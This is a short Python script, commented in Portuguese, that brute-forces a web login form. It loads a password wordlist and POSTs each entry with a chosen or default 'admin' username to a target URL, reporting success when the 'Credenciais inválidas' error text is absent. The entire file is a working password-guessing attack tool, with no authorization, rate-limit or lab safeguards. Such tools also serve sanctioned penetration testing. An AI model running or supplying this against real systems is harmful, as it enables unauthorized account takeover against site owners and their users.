import requests
import argparse

# Criar um objeto ArgumentParser
parser = argparse.ArgumentParser(description='Script para testar força bruta em login')

# Adicionar argumentos de linha de comando
parser.add_argument('url', help='URL do login')
parser.add_argument('wordlist', help='Caminho para o arquivo de wordlist')
parser.add_argument('-u', '--usuario', help='Nome de usuário')

# Obter os argumentos de linha de comando
args = parser.parse_args()

# Definir a URL e a palavra de erro
url = args.url
erro = 'Credenciais inválidas'

# Ler a wordlist de senhas
with open(args.wordlist, 'r', encoding='ISO-8859-1') as arquivo:
    senhas = arquivo.read().splitlines()

# Iterar sobre as senhas e tentar fazer login
for senha in senhas:
    # Obter o nome de usuário (ou usar o nome de usuário padrão 'admin')
    usuario = args.usuario or 'admin'
    
    # Enviar a requisição POST com as credenciais
    dados = {'username': usuario, 'password': senha}
    resposta = requests.post(url, data=dados)
    
    # Verificar se o login foi bem-sucedido
    if erro not in resposta.text:
        print(f'Senha encontrada: {senha}')
        break
else:
    print('Nenhuma senha encontrada.')
